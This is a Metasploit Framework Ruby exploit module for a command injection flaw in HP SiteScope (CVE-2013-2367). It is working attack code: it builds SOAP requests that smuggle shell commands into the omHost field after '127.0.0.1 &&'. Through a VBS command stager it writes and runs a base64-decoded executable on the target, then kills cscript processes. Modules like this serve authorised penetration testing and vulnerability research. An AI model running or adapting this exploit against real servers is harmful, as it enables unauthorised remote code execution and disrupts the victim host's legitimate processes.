##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ManualRanking

  HttpFingerprint = { :pattern => [ /Apache-Coyote/ ] }

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStagerVBS

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'HP SiteScope Remote Code Execution',
      'Description' => %q{
          This module exploits a code execution flaw in HP SiteScope.
        The vulnerability exists on the opcactivate.vbs script, which
        is reachable from the APIBSMIntegrationImpl AXIS service, and
        uses WScript.Shell.run() to execute cmd.exe with user provided
        data. Note which the opcactivate.vbs component is installed
        with the (optional) HP Operations Agent component. The module
        has been tested successfully on HP SiteScope 11.20 (with HP
        Operations Agent) over Windows 2003 SP2.
      },
      'Author'       =>
        [
          'rgod <rgod[at]autistici.org>', # Vulnerability discovery
          'juan vazquez' # Metasploit module
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          [ 'CVE', '2013-2367'],
          [ 'OSVDB', '95824' ],
          [ 'BID', '61506' ],
          [ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-13-205/' ]
        ],
      'Privileged'  => true,
      'Platform'    => 'win',
      'Arch'        => ARCH_X86,
      'Targets'     =>
        [
          [ 'HP SiteScope 11.20 (with Operations Agent) / Windows 2003 SP2', {} ]
        ],
      'DefaultTarget'  => 0,
      'DefaultOptions'  =>
        {
          'DECODERSTUB' => File.join(Msf::Config.data_directory, "exploits", "cmdstager", "vbs_b64_noquot")
        },
      'DisclosureDate' => 'Jul 29 2013'))

    register_options(
      [
        Opt::RPORT(8080),
        OptString.new('TARGETURI', [true, 'Path to SiteScope', '/SiteScope/'])
      ], self.class)
  end

  def uri
    uri = normalize_uri(target_uri.path)
    uri << '/' if uri[-1,1] != '/'
    return uri
  end

  def check

    op = rand_text_alpha(8 + rand(10))
    key = rand_text_alpha(8 + rand(10))
    value = rand_text_alpha(8 + rand(10))

    res = send_soap_request(op, key, value)

    if res and res.code == 200 and res.body =~ /runOMAgentCommandResponse/
      return Exploit::CheckCode::Detected
    end

    return Exploit::CheckCode::Safe
  end

  def exploit
    @peer = "#{rhost}:#{rport}"

    print_status("#{@peer} - Delivering payload...")

    # The path to the injection is something like:
    # * Java exec => cscript => WScript.Shell => cmd.exe (injection happens)
    # Empirically has been tested a 1500 value for :linemax makes it work
    # reliable
    execute_cmdstager({:linemax => 1500})
  end

  def get_vbs_string(str)
    vbs_str = ""
    str.each_byte { |b|
      vbs_str << "Chr(#{b})+"
    }

    return vbs_str.chomp("+")
  end

  # Make the modifications required to the specific encoder
  # This exploit uses an specific encoder because quotes (")
  # aren't allowed when injecting commands
  def execute_cmdstager_begin(opts)
    var_decoded = @stager_instance.instance_variable_get(:@var_decoded)
    var_encoded = @stager_instance.instance_variable_get(:@var_encoded)
    decoded_file = "#{var_decoded}.exe"
    encoded_file = "#{var_encoded}.b64"
    @cmd_list.each { |command|
      # Because the exploit kills cscript processes to speed up and reliability
      command.gsub!(/cscript \/\/nologo/, "wscript //nologo")
      command.gsub!(/CHRENCFILE/, get_vbs_string(encoded_file))
      command.gsub!(/CHRDECFILE/, get_vbs_string(decoded_file))
    }
  end

  def execute_command(cmd, opts={})
    # HTML Encode '&' character
    # taskkill allows to kill the cscript process which is triggering the
    # different operations performed by the OPACTIVATE command. It speeds
    # up exploitation and improves reliability (some processes launched can die
    # due to the fake activation). But this line also will kill other cscript
    # legit processes which could be running on the target host. Because of it
    # the exploit has a Manual ranking
    command = "&#x22;127.0.0.1 &#x26;&#x26; "
    command << cmd.gsub(/&/, "&#x26;")
    command << " &#x26;&#x26; taskkill /F /IM cscript.exe &#x22;"

    res = send_soap_request("OPCACTIVATE", "omHost", command)

    if res.nil? or res.code != 200 or res.body !~ /runOMAgentCommandResponse/
      fail_with(Failure::Unknown, "#{@peer} - Unexpected response, aborting...")
    end

  end

  def send_soap_request(op, key, value)
    data = "<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" "
    data << "xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:api=\"http://Api.freshtech.COM\">"
    data << "<soapenv:Header/>"
    data << "<soapenv:Body>"
    data << "<api:runOMAgentCommand soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
    data << "<in0 xsi:type=\"x-:Map\" xmlns:x-=\"http://xml.apache.org/xml-soap\">"
    data << "<item xsi:type=\"x-:mapItem\">"
    data << "<key xsi:type=\"xsd:string\">#{key}</key>"
    data << "<value xsi:type=\"xsd:string\">#{value}</value>"
    data << "</item>"
    data << "</in0>"
    data << "<in1 xsi:type=\"xsd:string\">#{op}</in1>"
    data << "</api:runOMAgentCommand>"
    data << "</soapenv:Body>"
    data << "</soapenv:Envelope>"

    res = send_request_cgi({
      'uri'      => normalize_uri(uri, 'services', 'APIBSMIntegrationImpl'),
      'method'   => 'POST',
      'ctype'    => 'text/xml; charset=UTF-8',
      'data'     => data,
      'headers'  => {
        'SOAPAction' => '""'
      }
    })

    return res
  end

end
